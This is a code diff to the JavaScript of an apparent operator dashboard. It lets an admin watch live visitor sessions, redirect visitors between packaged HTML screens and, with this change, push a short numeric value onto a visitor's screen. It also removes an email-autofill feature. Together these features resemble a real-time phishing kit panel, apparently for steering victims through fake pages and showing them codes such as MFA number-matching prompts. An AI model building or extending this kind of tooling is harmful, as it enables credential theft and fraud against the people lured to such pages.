@@ -1905,6 +1905,7 @@ async function applyBulkResults(page, action, resultIds) {
 }
 
 function commandStatusLabel(command = null) {
+  if (command?.action === "displayValue" && command.value) return "Value shown to visitor";
   if (!command?.targetUrl) return "No command queued";
   const label = command.note || command.targetUrl;
   if (command.status === "delivered") return `Delivered: ${label}`;
@@ -1963,6 +1964,9 @@ function sessionCommandMarkup(sessionId, pageSlug, pageTargets = [], command = n
   const currentFileKey = normalizedRuntimeScreenFile(currentFile).toLowerCase();
   const page = getPageBySlug(pageSlug);
   const controlsDisabled = disabledPageCapabilityAttributes(page, "controlSessions");
+  const pageScreens = Array.isArray(page?.packageManifest?.screens) ? page.packageManifest.screens : [];
+  const pageAllowsPush = pageScreens.some((screen) => screen.allowPushValue);
+  const pushDisabled = (controlsDisabled || !pageAllowsPush) ? ' disabled aria-disabled="true"' : "";
   const targetButton = (target) => {
     const isCurrent = currentFileKey
       ? normalizedRuntimeScreenFile(target.file).toLowerCase() === currentFileKey
@@ -1986,6 +1990,14 @@ function sessionCommandMarkup(sessionId, pageSlug, pageTargets = [], command = n
       </div>
       <button type="button" data-session-clear="${escapeHtml(sessionId)}" data-session-page="${escapeHtml(pageSlug)}"${controlsDisabled}>Clear</button>
       <small class="${command?.status === "delivered" ? "is-delivered" : command?.targetUrl ? "is-queued" : ""}">${escapeHtml(commandStatusLabel(command))}</small>
+      <div class="session-push" ${pageAllowsPush ? "" : "hidden"}>
+        <strong class="flow-command-title">Push to visitor</strong>
+        <div class="session-push-row">
+          <input type="text" inputmode="numeric" maxlength="64" autocomplete="off" placeholder="Value" data-session-push-value="${escapeHtml(sessionId)}" data-session-page="${escapeHtml(pageSlug)}"${pushDisabled}>
+          <button type="button" data-session-push="${escapeHtml(sessionId)}" data-session-page="${escapeHtml(pageSlug)}"${pushDisabled}>Push</button>
+        </div>
+        ${command?.action === "displayValue" ? `<small class="is-queued">Showing: ${escapeHtml(command.value)}</small>` : ""}
+      </div>
     </div>
   `;
 }
@@ -2010,10 +2022,10 @@ function activeSessionCardMarkup(session, page, pageTargets = [], command = null
 
 function latestSessionCommand(sessionId, sessionCommands = {}, sessionCommandHistory = {}) {
   const active = sessionCommands[sessionId];
-  if (active?.targetUrl) return active;
+  if (active && (active.targetUrl || (active.action === "displayValue" && active.value))) return active;
   const history = sessionCommandHistory[sessionId];
   if (Array.isArray(history)) return history[0] || null;
-  return history?.targetUrl ? history : null;
+  return history && (history.targetUrl || (history.action === "displayValue" && history.value)) ? history : null;
 }
 
 function sessionResultDetailMarkup(session, page) {
@@ -2625,6 +2637,7 @@ function collectAdminPackagePayload(page) {
       state: row.querySelector("[data-package-screen-state]")?.value || "default",
       enabled: Boolean(row.querySelector("[data-package-screen-enabled]")?.checked),
       showInRedirects: Boolean(row.querySelector("[data-package-screen-redirect]")?.checked),
+      allowPushValue: Boolean(row.querySelector("[data-package-screen-push]")?.checked),
       needsReview: false,
       order,
       fieldManifest: {
@@ -2648,12 +2661,6 @@ function collectAdminPackagePayload(page) {
     type: value("type", page.type || page.sourceType || "Page package"),
     description: value("description", page.description || ""),
     marketplaceRegions: selectedRegions,
-    emailHandoff: {
-      enabled: Boolean(preview.querySelector("[data-package-email-handoff-enabled]")?.checked),
-      sourceFieldId: preview.querySelector("[data-package-email-handoff-source]")?.value || "",
-      destinationFieldId: preview.querySelector("[data-package-email-handoff-destination]")?.value || "",
-      clearOnFinalScreen: Boolean(preview.querySelector("[data-package-email-handoff-clear]")?.checked)
-    },
     screens: mappedScreens
   };
   return {
@@ -2697,21 +2704,6 @@ async function openAdminPackagePreview(page) {
   if (!page) throw new Error("Package not found");
   await openPackagePreview(page);
   statusText.textContent = `${page.name.toUpperCase()} PREVIEW OPENED`;
-}
-
-async function testAdminEmailHandoff(page) {
-  if (!page) throw new Error("Package not found");
-  const payload = collectAdminPackagePayload(page);
-  const handoff = payload.packageManifest?.emailHandoff || {};
-  if (!handoff.enabled) throw new Error("Enable email autofill before testing");
-  if (!handoff.sourceFieldId) throw new Error("Select a source email field");
-  if (!handoff.destinationFieldId) throw new Error("Select a destination email field");
-  if (handoff.sourceFieldId === handoff.destinationFieldId) throw new Error("Choose different source and destination fields");
-  const updated = await saveAdminPackage(page, { rerender: false });
-  await openPackagePreview(updated);
-  const testStatus = preview.querySelector("[data-email-handoff-status]");
-  if (testStatus) testStatus.textContent = "Preview opened. Enter preview@example.com in the source field, continue to the destination screen, and confirm it appears automatically. No result is submitted by the preview.";
-  statusText.textContent = "EMAIL AUTOFILL TEST PREVIEW OPENED";
 }
 
 async function publishAdminPackage(page) {
@@ -5350,6 +5342,7 @@ async function renderAdminPackageEditor(packageSlug = "page-a") {
       state,
       enabled: configured.enabled !== false,
       showInRedirects: configured.showInRedirects !== false,
+      allowPushValue: configured.allowPushValue === true,
       needsReview: configured.needsReview === true,
       missing: !availableHtmlFiles.has(String(file).toLowerCase())
     };
@@ -5364,18 +5357,6 @@ async function renderAdminPackageEditor(packageSlug = "page-a") {
   const configuredFinalId = page.packageManifest?.finalScreenId
     || editorScreens.find((screen) => screen.stage === "success")?.id
     || "";
-  const emailHandoff = page.packageManifest?.emailHandoff || {};
-  const handoffFields = editorScreens.flatMap((screen) => (screen.fieldManifest?.fields || [])
-    .filter((field) => ["email", "text", "tel", "textarea"].includes(String(field.type || "text").toLowerCase()))
-    .map((field) => ({
-      id: field.id,
-      label: `${screen.buttonLabel} — ${field.label || field.id}`,
-      type: field.type || "text"
-    })));
-  const handoffOptions = (selectedId) => [
-    `<option value="">Select a detected field</option>`,
-    ...handoffFields.map((field) => `<option value="${escapeHtml(field.id)}" ${field.id === selectedId ? "selected" : ""}>${escapeHtml(field.label)} (${escapeHtml(field.type)})</option>`)
-  ].join("");
 
   preview.innerHTML = `
     <section class="app-view">
@@ -5487,6 +5468,7 @@ async function renderAdminPackageEditor(packageSlug = "page-a") {
                   <label><input type="radio" name="package-final-screen" data-package-screen-final ${screen.id === configuredFinalId ? "checked" : ""}> Final</label>
                   <label><input type="checkbox" data-package-screen-enabled ${screen.enabled ? "checked" : ""}> Enabled</label>
                   <label><input type="checkbox" data-package-screen-redirect ${screen.showInRedirects ? "checked" : ""}> Redirect</label>
+                  <label><input type="checkbox" data-package-screen-push ${screen.allowPushValue ? "checked" : ""}> Push value</label>
                 </div>
                 <em>${screen.id === configuredEntryId ? "Entry" : screen.id === configuredFinalId ? "Final" : "Screen"}</em>
                 <span class="screen-order-actions"><button type="button" data-package-screen-move="up" aria-label="Move ${escapeHtml(screen.buttonLabel)} up">&#8593;</button><button type="button" data-package-screen-move="down" aria-label="Move ${escapeHtml(screen.buttonLabel)} down">&#8595;</button>${screen.missing ? `<button type="button" class="danger" data-package-screen-remove aria-label="Remove missing ${escapeHtml(screen.buttonLabel)} mapping">Remove</button>` : ""}</span>
@@ -5494,20 +5476,6 @@ async function renderAdminPackageEditor(packageSlug = "page-a") {
               </div>
             `).join("")}
           </div>
-        </article>
-
-        <article class="security-panel package-form email-handoff-panel">
-          <small>session field handoff</small>
-          <h3>Email autofill between screens</h3>
-          <p>Enable only for packages whose own journey carries an email into a later screen. Values remain in the visitor's current browser session and are never added to redirect URLs.</p>
-          <label class="security-check"><input type="checkbox" data-package-email-handoff-enabled ${emailHandoff.enabled ? "checked" : ""}> Enable email autofill between screens</label>
-          <label><span>Source field</span><select data-package-email-handoff-source>${handoffOptions(emailHandoff.sourceFieldId || "")}</select></label>
-          <label><span>Destination field</span><select data-package-email-handoff-destination>${handoffOptions(emailHandoff.destinationFieldId || "")}</select></label>
-          <label class="security-check"><input type="checkbox" data-package-email-handoff-clear ${emailHandoff.clearOnFinalScreen !== false ? "checked" : ""}> Clear after final screen</label>
-          <div class="admin-actions">
-            <button type="button" data-test-email-handoff="${escapeHtml(page.slug)}">Test email autofill</button>
-          </div>
-          <code data-email-handoff-status>${handoffFields.length ? "Test opens a safe package preview. Enter preview@example.com in the source field and continue to verify autofill." : "No compatible email or text fields were detected in this package."}</code>
         </article>
 
         <article class="security-panel">
@@ -5649,8 +5617,12 @@ function renderAdminUsers() {
             <p>This raw link is shown only now. Creating another invite for the same email revokes the old pending link.</p>
           </div>
         ` : ""}
+        ${["pending", "history"].map((group) => {
+          const invitations = adminInvitations.filter((invitation) => group === "pending" ? invitation.status === "pending" : invitation.status !== "pending");
+          if (group === "history" && !invitations.length) return "";
+          return `${group === "history" ? `<details class="invite-history"><summary>Invitation history (${invitations.length})</summary>` : ""}
         <div class="invite-list">
-          ${adminInvitations.length ? adminInvitations.slice(0, 20).map((invitation) => `
+          ${invitations.length ? invitations.map((invitation) => `
             <article>
               <div>
                 <strong>${escapeHtml(invitation.email)}</strong>
@@ -5662,8 +5634,10 @@ function renderAdminUsers() {
                 ${invitation.status === "pending" ? `<button type="button" data-revoke-admin-invite="${escapeHtml(invitation.id)}">Revoke</button>` : ""}
               </div>
             </article>
-          `).join("") : `<p class="invite-empty">No invitations yet. Create one to enable a new signup.</p>`}
+          `).join("") : `<p class="invite-empty">No pending invitations. Create one to invite a new user.</p>`}
         </div>
+        ${group === "history" ? "</details>" : ""}`;
+        }).join("")}
       </article>` : ""}
 
       ${canReviewFunding ? `<article class="admin-table-card">
@@ -9119,16 +9093,6 @@ preview.addEventListener("click", async (event) => {
     return;
   }
 
-  const testEmailHandoffButton = event.target.closest("[data-test-email-handoff]");
-  if (testEmailHandoffButton) {
-    try {
-      await withButtonBusy(testEmailHandoffButton, "Opening test", () => testAdminEmailHandoff(getAdminPackage(testEmailHandoffButton.dataset.testEmailHandoff)));
-    } catch (error) {
-      statusText.textContent = `EMAIL AUTOFILL TEST FAILED: ${safeErrorMessage(error)}`.toUpperCase();
-    }
-    return;
-  }
-
   const previewAdminPackageButton = event.target.closest("[data-admin-package-preview]");
   if (previewAdminPackageButton) {
     try { await openAdminPackagePreview(getAdminPackage(previewAdminPackageButton.dataset.adminPackagePreview)); }
@@ -9579,6 +9543,35 @@ preview.addEventListener("click", async (event) => {
       statusText.textContent = "LIVE USER COMMAND CLEARED";
     })).catch((error) => {
       statusText.textContent = `CLEAR FAILED: ${safeErrorMessage(error)}`.toUpperCase();
+    });
+    return;
+  }
+
+  const sessionPushButton = event.target.closest("[data-session-push]");
+  if (sessionPushButton) {
+    event.preventDefault();
+    const resultPage = getPageBySlug(sessionPushButton.dataset.sessionPage);
+    const sessionId = sessionPushButton.dataset.sessionPush;
+    if (!resultPage || !sessionId) return;
+    const pushContainer = sessionPushButton.closest(".session-command");
+    const valueInput = pushContainer?.querySelector("[data-session-push-value]");
+    const value = valueInput?.value?.trim() || "";
+    if (!value) {
+      statusText.textContent = "ENTER A VALUE TO PUSH";
+      valueInput?.focus();
+      return;
+    }
+    await withButtonBusy(sessionPushButton, "Pushing", () => runResultsMutation(async () => {
+      const result = await requestApi(`/api/user-pages/${resultPage.id}/sessions/${encodeURIComponent(sessionId)}/command`, {
+        method: "POST",
+        body: JSON.stringify({ action: "displayValue", value })
+      });
+      const updated = normalizeUserPage(result.userPage);
+      ownedPages = ownedPages.map((item) => item.id === updated.id ? { ...item, ...updated } : item);
+      await renderResultsCenter(pageRouteKey(updated));
+      statusText.textContent = "VALUE PUSHED TO LIVE USER";
+    })).catch((error) => {
+      statusText.textContent = `PUSH FAILED: ${safeErrorMessage(error)}`.toUpperCase();
     });
     return;
   }
